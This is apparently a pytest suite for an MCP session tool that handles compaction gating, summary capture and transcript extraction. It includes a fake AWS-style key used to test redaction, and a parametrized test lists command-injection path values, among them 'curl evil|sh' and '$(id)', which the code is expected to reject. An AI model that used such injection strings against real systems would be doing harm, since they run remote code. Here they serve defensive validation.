"""The session tool's hook actions through MCP: gate, capture, end, the nudge and extraction."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml
from conftest import TODAY, mcp_client

from episteme import session as sessions
from episteme.engine import Engine
from episteme.session import store

pytestmark = pytest.mark.anyio

BODY = "## Objetivo\n\nProbar el estado.\n\n## Siguiente paso\n\nCorrer los tests.\n"
FAKE_KEY = "AKIA" + "ABCDEFGHIJKLMNOP"
TRANSCRIPT = "/home/u/.claude/projects/-repo/abc.jsonl"
BLOCK = "el estado de la sesión no se guarda desde hace"
NUDGE = "el estado de la sesión no se actualiza desde hace"


def _fm(path: Path) -> dict:
    return yaml.safe_load(path.read_text(encoding="utf-8").split("---\n")[1])


def _config(vault: Path, extra: str = "", drop_state_glob: bool = True) -> None:
    toml = vault / "episteme.toml"
    text = toml.read_text(encoding="utf-8")
    if drop_state_glob:
        text = text.split("[checkpoint]")[0]
    toml.write_text(text + "\n" + extra + "\n", encoding="utf-8")


async def _prompts(c, n: int, session: str = "s1") -> list[str]:
    """Send ``n`` user messages through the UserPromptSubmit hook; their hook outputs."""
    return [
        await c.ok(
            "context",
            mode="welcome",
            session=session,
            prompt="sigue",
            hook_event="UserPromptSubmit",
        )
        for _ in range(n)
    ]


async def _gate(c, trigger: str = "manual", session: str = "s1") -> str:
    return await c.ok(
        "session", action="gate", trigger=trigger, session=session, hook_event="PreCompact"
    )


async def test_gate_blocks_a_stale_manual_compact_once(vault: Path) -> None:
    _config(vault)
    async with mcp_client(vault) as c:
        await _prompts(c, 6)
        first = await _gate(c)
        second = await _gate(c)

    out = json.loads(first)
    assert out["decision"] == "block" and BLOCK in out["reason"]
    assert "5 mensajes" in out["reason"]
    assert second == ""


@pytest.mark.parametrize(
    ("prompts", "trigger", "extra"),
    [
        (6, "auto", ""),
        (4, "manual", ""),
        (6, "manual", "[session]\nblock_manual_compact = false"),
    ],
)
async def test_gate_lets_through(vault: Path, prompts: int, trigger: str, extra: str) -> None:
    _config(vault, extra)
    async with mcp_client(vault) as c:
        await _prompts(c, prompts)
        text = await _gate(c, trigger)

    assert text == ""


async def test_gate_lets_through_after_a_save(vault: Path) -> None:
    _config(vault)
    async with mcp_client(vault) as c:
        await _prompts(c, 6)
        await c.ok("session", action="save", title="Hilo", body=BODY)
        await _prompts(c, 2)
        text = await _gate(c)
        agent = await c.error("session", action="gate", trigger="manual", session="s1")

    assert text == ""
    assert agent.startswith("invalid_argument:") and "PreCompact" in agent


async def test_gate_saves_the_deprecated_checkpoint(vault: Path, project_dir: Path) -> None:
    sessions = vault / "memory/fabrik/sessions"
    before = set(sessions.glob("*.md")) if sessions.exists() else set()
    async with mcp_client(vault) as c:
        await c.ok(
            "session",
            action="gate",
            trigger="auto",
            project_dir=str(project_dir),
            hook_event="PreCompact",
        )

    assert set(sessions.glob("*.md")) - before


async def test_state_nudge_after_12_messages_and_again_after_a_save(vault: Path) -> None:
    _config(vault)
    async with mcp_client(vault) as c:
        first = await _prompts(c, 13)
        await c.ok("session", action="save", title="Hilo", body=BODY)
        after = await _prompts(c, 13)

    hits = [i + 1 for i, text in enumerate(first) if NUDGE in text]
    assert hits == [13]
    assert "hace 12 mensajes" in first[12]
    assert [i for i, text in enumerate(after) if NUDGE in text] == [12]


async def test_capture_without_state_creates_one_with_the_clean_summary(vault: Path) -> None:
    summary = f"<analysis>\nborrador\n</analysis>\n\n## Resumen\n\nUsa {FAKE_KEY} para entrar."
    async with mcp_client(vault) as c:
        text = await c.ok(
            "session", action="capture", summary=summary, session="abc-1", hook_event="PostCompact"
        )
        shown = await c.ok("session", action="show")

    assert text == ""
    assert shown["task_title"] == f"Sesión {TODAY}"
    content = shown["content"]
    assert "## Resumen de compactación" in content and "#### Resumen" in content
    assert "borrador" not in content and FAKE_KEY not in content
    assert "[credencial omitida]" in content
    fm = _fm(vault / shown["path"])
    assert fm["saved_by"] == "compact" and "saved_at" not in fm
    assert fm["session_id"] == "abc-1" and str(fm["compacted_at"]).startswith(TODAY)


async def test_capture_replaces_its_section_and_keeps_the_state(vault: Path) -> None:
    async with mcp_client(vault) as c:
        saved = await c.ok("session", action="save", title="Hilo", body=BODY)
        saved_at = _fm(vault / saved["path"])["saved_at"]
        one = await c.ok("session", action="capture", summary="Primero.")
        two = await c.ok("session", action="capture", summary="Segundo.")

    assert one == two == {"path": saved["path"], "created": False}
    text = (vault / saved["path"]).read_text(encoding="utf-8")
    assert text.count("## Resumen de compactación") == 1
    assert "Segundo." in text and "Primero." not in text and "Correr los tests." in text
    fm = _fm(vault / saved["path"])
    assert fm["saved_by"] == "compact" and fm["saved_at"] == saved_at


async def test_capture_of_an_empty_summary_writes_nothing(vault: Path) -> None:
    async with mcp_client(vault) as c:
        res = await c.ok("session", action="capture", summary="<analysis>x</analysis>")
        shown = await c.ok("session", action="show")

    assert res == {"path": None, "created": False} and shown["found"] is False


async def test_restore_after_compact_orders_the_extraction(vault: Path) -> None:
    async with mcp_client(vault) as c:
        saved = await c.ok("session", action="save", title="Hilo", body=BODY)
        text = await c.ok(
            "session",
            action="restore",
            source="compact",
            transcript=TRANSCRIPT,
            hook_event="SessionStart",
        )

    context = json.loads(text)["hookSpecificOutput"]["additionalContext"]
    saved_at = _fm(vault / saved["path"])["saved_at"]
    assert "lanza en segundo plano el agente episteme:extractor" in context
    assert f"desde={saved_at} estado={saved['path']} proyecto=fabrik" in context
    assert context.endswith(f"transcript={TRANSCRIPT}")


async def test_restore_after_clear_uses_the_transcript_end_kept_once(vault: Path) -> None:
    _config(vault)
    async with mcp_client(vault) as c:
        ended = await c.ok(
            "session", action="end", transcript=TRANSCRIPT, reason="clear", hook_event="SessionEnd"
        )
        first = await c.ok("session", action="restore", source="clear")
        second = await c.ok("session", action="restore", source="clear")

    assert ended == ""
    order = f"desde=inicio estado=nuevo proyecto=fabrik transcript={TRANSCRIPT}"
    assert first["extract"].endswith(order)
    assert "extract" not in second


@pytest.mark.parametrize(
    ("extra", "transcript"),
    [("[session]\nextract = false", TRANSCRIPT), ("", "/tmp/notes.txt"), ("", None)],
)
async def test_restore_without_extraction(vault: Path, extra: str, transcript: str | None) -> None:
    _config(vault, extra)
    async with mcp_client(vault) as c:
        res = await c.ok("session", action="restore", source="compact", transcript=transcript)

    assert "extract" not in res


@pytest.mark.parametrize(
    ("transcript", "reason", "kept"),
    [
        (TRANSCRIPT, None, True),
        ("C:\\Users\\Ana Pérez\\.claude\\projects\\x\\a.jsonl", "clear", True),
        (TRANSCRIPT, "logout", False),
        ("/x/projects/a'; curl evil|sh; '.jsonl", None, False),
        ("/x/projects/$(id).jsonl", None, False),
        ("x\ny.jsonl", None, False),
        ("/x/projects/a.txt", None, False),
    ],
)
async def test_end_keeps_only_a_safe_transcript_of_a_clear(
    vault: Path, transcript: str, reason: str | None, kept: bool
) -> None:
    async with mcp_client(vault) as c:
        res = await c.ok("session", action="end", transcript=transcript, reason=reason)

    assert res == {"transcript": kept}


def test_restore_with_extract_off_still_consumes_the_transcript(
    vault: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _config(vault, "[session]\nextract = false")
    monkeypatch.setattr(store, "LAST_TRANSCRIPT", [])
    engine = Engine(vault, "fabrik")

    sessions.end(TRANSCRIPT, "clear")
    off = sessions.restore(engine, "fabrik", None, "clear")

    assert "extract" not in off and store.LAST_TRANSCRIPT == []


async def test_capture_ignores_an_unsubstituted_placeholder(vault: Path) -> None:
    async with mcp_client(vault) as c:
        res = await c.ok("session", action="capture", summary="${compact_summary}")

    assert res == {"path": None, "created": False}
